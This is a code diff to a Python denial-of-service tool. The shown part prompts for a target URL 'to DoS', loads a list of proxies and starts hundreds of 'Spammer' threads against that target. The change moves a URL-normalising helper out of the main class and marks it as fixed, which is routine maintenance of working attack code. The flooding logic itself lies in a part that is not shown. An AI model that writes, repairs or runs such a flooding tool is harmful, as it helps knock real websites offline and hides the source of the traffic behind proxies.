@@ -8288,20 +8288,11 @@ class Spammer(threading.Thread):
                 print(f"Error in thread #{self.num}: {e}")
 
 class MainLoop:
-    def check_url(self, url):
-        if url[:4] == "www.":
-            url = "https://" + url
-        elif url[:4] == "http":
-            pass
-        else:
-            url = "https://" + url
-        return url
-
     def setup(self):
         global N
         N = 0
         url = input('> Enter the target URL to DoS: ')
-        url = self.check_url(url)
+        url = check_url(url)  # FIXED: Now correctly using the global function
 
         proxy_file = input('> Enter the path to the proxy list: ')
         with open(proxy_file, 'r') as in_file:
@@ -8310,6 +8301,15 @@ class MainLoop:
         num_threads = int(input('> Enter the number of threads [600]: ') or '600')
         for i in range(num_threads):
             Spammer(url, i + 1, proxy_list).start()
+
+def check_url(url):
+    if url.startswith("www."):
+        url = "https://" + url
+    elif url.startswith("http"):
+        pass
+    else:
+        url = "https://" + url
+    return url
 
 if __name__ == '__main__':
     b = MainLoop()
